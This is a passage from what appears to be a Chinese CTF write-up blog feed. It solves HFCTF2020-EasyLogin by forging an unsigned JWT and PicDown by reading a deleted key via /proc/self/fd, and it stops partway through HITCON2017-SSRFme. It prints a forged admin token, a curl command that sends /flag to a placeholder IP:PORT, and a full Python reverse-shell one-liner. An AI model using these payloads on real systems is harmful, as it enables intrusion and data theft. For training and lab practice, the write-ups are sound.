        <content type="html"><![CDATA[<h1 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="HFCTF2020-EasyLogin"></a>HFCTF2020-EasyLogin</h1><p>首先一打开是个登录界面</p><p><img src="/../image/HFCTF2020-EasyLogin-1.png"></p><p>注册个号登录进去。</p><p><img src="/../image/HFCTF2020-EasyLogin-2.png"></p><p>发现一个GET FLAG，点一下弹出信息permission denied，提示没有权限，我们在登录界面用bp抓个包</p><p><img src="/../image/HFCTF2020-EasyLogin-3.png"></p><p>发现一串base64组成的jwt码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiIsInR5</span>cCI<span class="hljs-number">6</span>IkpX<span class="hljs-attr">VCJ9</span>.eyJzZW<span class="hljs-symbol">NyZXRpZCI6</span>MSwidX<span class="hljs-symbol">Nlcm5</span>hbWUiOiJtaXhicCIsI<span class="hljs-symbol">nBhc3</span><span class="hljs-symbol">N3</span>b<span class="hljs-number">3</span>JkIjoiMTIzIiwiaWF<span class="hljs-number">0</span>Ijox<span class="hljs-symbol">NzQzOTE5</span>OTYzfQ.QsP<span class="hljs-number">3</span>tYzvKrrPc<span class="hljs-symbol">nbB3</span>QJ<span class="hljs-number">1</span>QDeW<span class="hljs-number">69</span>HpJYUb<span class="hljs-number">9</span><span class="hljs-symbol">nLF0</span>x<span class="hljs-number">81</span><span class="hljs-symbol">NRE</span><br></code></pre></td></tr></table></figure><p>在<a href="https://jwt.io/%E4%B8%AD%E6%89%93%E5%BC%80">https://jwt.io/中打开</a></p><p><img src="/../image/HFCTF2020-EasyLogin-4.png"></p><p>然后在controllers&#x2F;api.js访问主要逻辑代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">crypto</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">fs</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">jwt</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">APIError</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).APIError;<br><br>module.exports = &#123;<br>    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br><br>        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">global</span>.secrets.length &gt; <span class="hljs-number">100000</span>) &#123;<br>            <span class="hljs-keyword">global</span>.secrets = [];<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secret</span> = crypto.<span class="hljs-title function_ invoke__">randomBytes</span>(<span class="hljs-number">18</span>).<span class="hljs-title function_ invoke__">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secretid</span> = <span class="hljs-keyword">global</span>.secrets.length;<br>        <span class="hljs-keyword">global</span>.secrets.<span class="hljs-title function_ invoke__">push</span>(secret)<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">token</span> = jwt.<span class="hljs-title function_ invoke__">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            <span class="hljs-attr">token</span>: token<br>        &#125;);<br><br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br><br>        <span class="hljs-keyword">if</span>(!username || !password) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">token</span> = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sid</span> = JSON.<span class="hljs-title function_ invoke__">parse</span>(Buffer.<span class="hljs-keyword">from</span>(token.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>()).secretid;<br><br>        console.<span class="hljs-title function_ invoke__">log</span>(sid)<br><br>        <span class="hljs-keyword">if</span>(sid === undefined || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-keyword">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secret</span> = <span class="hljs-keyword">global</span>.secrets[sid];<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">user</span> = jwt.<span class="hljs-title function_ invoke__">verify</span>(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">status</span> = username === user.username &amp;&amp; password === user.password;<br><br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            ctx.session.username = username;<br>        &#125;<br><br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            status<br>        &#125;);<br><br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">flag</span> = fs.<span class="hljs-title function_ invoke__">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>();<br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            flag<br>        &#125;);<br><br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        ctx.session.username = <span class="hljs-literal">null</span>;<br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span><br>        &#125;)<br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>主要就是这里，对登录的用户名进行了判断，只有用户名是admin时才可以读取flag：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">const</span> flag = fs.readFileSync(<span class="hljs-string">&#x27;/flag&#x27;</span>).toString();<br>        ctx.rest(&#123;<br>            flag<br>        &#125;);<br> <br>        <span class="hljs-keyword">await</span> next();<br>    &#125;,<br></code></pre></td></tr></table></figure><p>我们需要把alg改为none，username改为admin，secretid改为数组类型[]，alg改为none表示不需要加密，username为admin获得登入权限。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade">利用nodejs的jwt缺陷，当jwt的secret为空，jwt会采用algorithm为<span class="hljs-built_in">none</span>进行解密。 <br>js是弱语言类型，可以将secretid设置为一个小数或空数组（空数组与数字比较时为<span class="hljs-number">0</span>）来绕过secretid的一个验证（不能为<span class="hljs-literal">null</span>&amp;<span class="hljs-literal">undefined</span>）<br><br>绕过代码<br><span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; global.secrets.<span class="hljs-built_in">length</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>     throw <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br> &#125;<br></code></pre></td></tr></table></figure><p>先在base64编码工具处修改alg</p><p><img src="/../image/HFCTF2020-EasyLogin-5.png"></p><p>然后将其替换掉原来的第一部分（注意需要去掉&#x3D;号），然后修改admin，secretid</p><p><img src="/../image/HFCTF2020-EasyLogin-6.png"></p><p><img src="/../image/HFCTF2020-EasyLogin-7.png"></p><p>由于不需要加密。jwt的第三部分就要删去，但是末尾的.需要保留，于是payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ewogICJhbGciOiAib<span class="hljs-name">m9</span>uZSIsCiAgI<span class="hljs-symbol">nR5</span>cCI<span class="hljs-number">6</span>ICJKV<span class="hljs-number">1</span>QiC<span class="hljs-symbol">n0</span>.eyJzZW<span class="hljs-symbol">NyZXRpZCI6</span>W<span class="hljs-number">10</span>sI<span class="hljs-symbol">nVzZXJuYW1</span>lIjoiYWRtaW<span class="hljs-number">4</span>iLCJwYX<span class="hljs-symbol">Nzd29</span>yZCI<span class="hljs-number">6</span>IjEyMyIsImlhdCI<span class="hljs-number">6</span>MTc<span class="hljs-number">0</span>MzkxOTk<span class="hljs-number">2</span><span class="hljs-name">M30.</span><br></code></pre></td></tr></table></figure><p>bp改包</p><p><img src="/../image/HFCTF2020-EasyLogin-8.png"></p><p>然后登录进去之后访问api&#x2F;flag即可看到flag。</p><p>或者先将get flag的请求抓包把response中的set-cookie放入api&#x2F;flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> jwt身份伪造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020白虎组-PicDown</title>
      <link href="/2025/04/02/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"/>
      <url>/2025/04/02/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯2020白虎组-PicDown"><a href="#网鼎杯2020白虎组-PicDown" class="headerlink" title="网鼎杯2020白虎组-PicDown"></a>网鼎杯2020白虎组-PicDown</h1><p><a href="https://blog.csdn.net/qq_46143339/article/details/146094942">参考文章</a></p><p>首先启动靶机并访问，发现只有一个输入框</p><p>发现这个输入框能够读取文件并以图片格式下载下来，所以我们可以利用url参数来尝试文件读取</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="Python2-urllib-特性"><a href="#Python2-urllib-特性" class="headerlink" title="Python2 urllib 特性"></a>Python2 urllib 特性</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">Python2 的 urllib.urlopen 支持直接输入文件路径（如 <span class="hljs-regexp">/etc/</span>passwd），无需 file:<span class="hljs-regexp">//</span> 前缀。通过提交路径 <span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cmdline 确认应用为 Python 进程，并获取启动命令 /u</span>sr<span class="hljs-regexp">/bin/</span>python <span class="hljs-regexp">/app/</span>app.py，确定工作目录为 /app。<br>读取应用源码<br>通过路径 `<span class="hljs-regexp">/app/</span>app.py` 获取 Flask 代码（篇幅问题完整代码和解析放在文章结尾），关键逻辑如下：<br></code></pre></td></tr></table></figure><hr><p>获取启动指定进程的完整命令</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-built_in">proc</span>/<span class="hljs-variable language_">self</span>/cmdline<br></code></pre></td></tr></table></figure><p>获得</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n2</span> app.py<br></code></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/cwd/</span>app.py<br>或者直接<br><span class="hljs-regexp">/app/</span>app.py<br></code></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs vim">from flask import Flask, Response<br>from flask import render_template<br>from flask import request<br>import os<br>import urllib<br><br>app = Flask(__name__)<br><br>SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br><span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(SECRET_FILE)<br>SECRET_KEY = <span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>().strip()<br>os.<span class="hljs-built_in">remove</span>(SECRET_FILE)<br><br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def <span class="hljs-built_in">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<br><br><br>@app.route(<span class="hljs-string">&#x27;/page&#x27;</span>)<br>def page():<br>    url = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> not url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>            <span class="hljs-keyword">res</span> = urllib.urlopen(url)<br>            value = <span class="hljs-keyword">res</span>.<span class="hljs-keyword">read</span>()<br>            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)<br>            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span><br>    except:<br>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, <span class="hljs-keyword">res</span>=value)<br><br><br>@app.route(<span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span>)<br>def manager():<br>    key = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-keyword">print</span>(SECRET_KEY)<br>    <span class="hljs-keyword">if</span> key == SECRET_KEY:<br>        <span class="hljs-keyword">shell</span> = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;shell&quot;</span>)<br>        os.<span class="hljs-built_in">system</span>(<span class="hljs-keyword">shell</span>)<br>        <span class="hljs-keyword">res</span> = <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">res</span> = <span class="hljs-string">&quot;Wrong Key!&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">res</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p>代码审计</p><p>发现&#x2F;no_one_know_the_manager路由有shell，需要密钥SECRET_KEY</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">SECRET_FILE <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br><span class="hljs-attribute">f</span> <span class="hljs-operator">=</span> open(SECRET_FILE)<br>SECRET_KEY <span class="hljs-operator">=</span> f.read().strip()<br>os.remove(SECRET_FILE)<br></code></pre></td></tr></table></figure><p><strong>fd 是一个目录，里面包含着当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。这里3为爆破得出。</strong></p><p>但是这里密钥被删除了，但是没有关闭，</p><p>可通过 <code>/proc/self/fd/[num]</code> 读取内容。遍历文件描述符（通常 <code>fd/3</code> 为第一个打开的文件）：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>rl=<span class="hljs-regexp">/proc/self</span><span class="hljs-regexp">/fd/</span><span class="hljs-number">3</span><br><br><span class="hljs-comment">#6A52Bigqn8UFGyTxvnvmgv/gOz75bVn4RXaiZMC302s=</span><br></code></pre></td></tr></table></figure><p>得到密钥后访问路由并且传入shell就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/no_one_know_the_manager?key=6A52Bigqn8UFGyTxvnvmgv/gOz75bVn4RXaiZMC302s=&amp;shell=命令<br></code></pre></td></tr></table></figure><h2 id="解法一-数据外带"><a href="#解法一-数据外带" class="headerlink" title="解法一 数据外带"></a>解法一 数据外带</h2><p><strong>外带数据</strong>：通过 <code>curl</code> 将命令结果发送到远程服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url/no_one_know_the_manager?key=6A52Bigqn8UFGyTxvnvmgv/gOz75bVn4RXaiZMC302s=&amp;shell=curl http://IP:PORT/$(<span class="hljs-built_in">cat</span> /flag|<span class="hljs-built_in">base64</span>)<br></code></pre></td></tr></table></figure><h2 id="解法二-反弹shell"><a href="#解法二-反弹shell" class="headerlink" title="解法二 反弹shell"></a>解法二 反弹shell</h2><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">url/no_one_know_the_manager?key=<span class="hljs-number">6</span>A52Bigqn8UFGyTxvnvmgv/gOz75bVn4RXaiZMC302s=&amp;shell=python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;IP&quot;</span>,PORT));os.dup2(s.fileno(),<span class="hljs-number">0</span>);os.dup2(s.fileno(),<span class="hljs-number">1</span>);os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure><p>反弹shell代码结构分析</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c &#x27;<br>import <span class="hljs-keyword">socket</span>, subprocess, os;<br>s = <span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET, <span class="hljs-keyword">socket</span>.SOCK_STREAM);<br>s.connect((<span class="hljs-string">&quot;IP&quot;</span>, PORT));<br>os.dup2(s.fileno(), <span class="hljs-number">0</span>);<br>os.dup2(s.fileno(), <span class="hljs-number">1</span>);<br>os.dup2(s.fileno(), <span class="hljs-number">2</span>);<br>p = subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>]);<br>&#x27;<br></code></pre></td></tr></table></figure><p>然后服务器开启监听 nc -lvvp PORT，最终在根目录 <code>/flag</code> 或 <code>/root/flag.txt</code> 获取 Flag。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件读取 </tag>
            
            <tag> Python-Flask框架审计 </tag>
            
            <tag> Linux特殊文件 </tag>
            
            <tag> python反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HITCON2017-SSRFme</title>
      <link href="/2025/04/02/HITCON2017-SSRFme/"/>
      <url>/2025/04/02/HITCON2017-SSRFme/</url>
      
        <content type="html"><![CDATA[<p>首先先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">192.168</span>.<span class="hljs-number">122.15</span> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$http_x_headers</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>        <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br><br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;GET &quot;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]));<br>    <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br>    <span class="hljs-variable">$dir</span>  = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;dirname&quot;</span>]));<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>    @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$dir</span>);<br>    @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;basename&quot;</span>]), <span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>开始代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;  <br>    <span class="hljs-variable">$http_x_headers</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span 